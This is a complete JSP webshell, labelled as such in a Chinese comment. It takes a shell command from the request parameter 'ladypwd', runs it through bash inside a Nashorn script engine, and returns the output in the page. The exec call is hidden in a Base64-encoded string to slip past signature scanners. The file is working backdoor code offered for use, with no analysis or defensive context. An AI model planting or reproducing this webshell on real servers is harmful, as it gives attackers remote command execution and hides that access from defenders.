<%@ page import="java.util.Base64" %>
<%@ page import="javax.script.ScriptEngineManager" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.io.InputStream" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%--
使用ScriptEngineManager.eval()实现的JSP Webshell
--%>
<%
    String s1 = "s=[3];s[0]='/bin/bash';s[1]='-c';s[2]='";
    String s2 = request.getParameter("ladypwd");
    String s3 = new String(Base64.getDecoder().decode("JztqYXZhLmxhbmcuUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhzKTs="));
    Process p = (Process) new ScriptEngineManager().getEngineByName("nashorn").eval(s1 + s2 + s3);
    InputStream in = p.getInputStream();
    StringBuilder sb = new StringBuilder();
    BufferedReader br = new BufferedReader(new InputStreamReader(in));
    String line;
    while((line = br.readLine()) != null) {
        sb.append(line).append("\n");
    }
    out.print("<pre>");
    if (sb.length() > 0) {
        out.print(sb.toString());
    }
    out.print("</pre>");
%>
